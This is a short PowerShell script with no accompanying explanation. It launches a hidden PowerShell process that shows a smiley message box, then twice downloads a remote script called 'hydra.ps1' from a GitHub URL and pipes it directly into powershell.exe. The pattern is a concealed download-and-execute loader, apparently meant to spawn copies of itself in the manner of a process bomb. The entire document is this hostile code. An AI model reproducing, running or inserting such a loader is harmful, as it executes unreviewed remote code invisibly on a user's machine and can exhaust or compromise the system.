$psi = New-Object System.Diagnostics.ProcessStartInfo;
$newproc = New-Object System.Diagnostics.Process;
$psi.FileName = 'powershell.exe';
$psi.Arguments = 'Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show(\":)\");(Invoke-Webrequest \"https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1\").content | powershell.exe;(Invoke-Webrequest \"https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1\").content | powershell.exe;'
$psi.CreateNoWindow = $true;
$psi.WindowStyle = 'Hidden';
$newproc.StartInfo = $psi;
$newproc.Start();
$newproc;
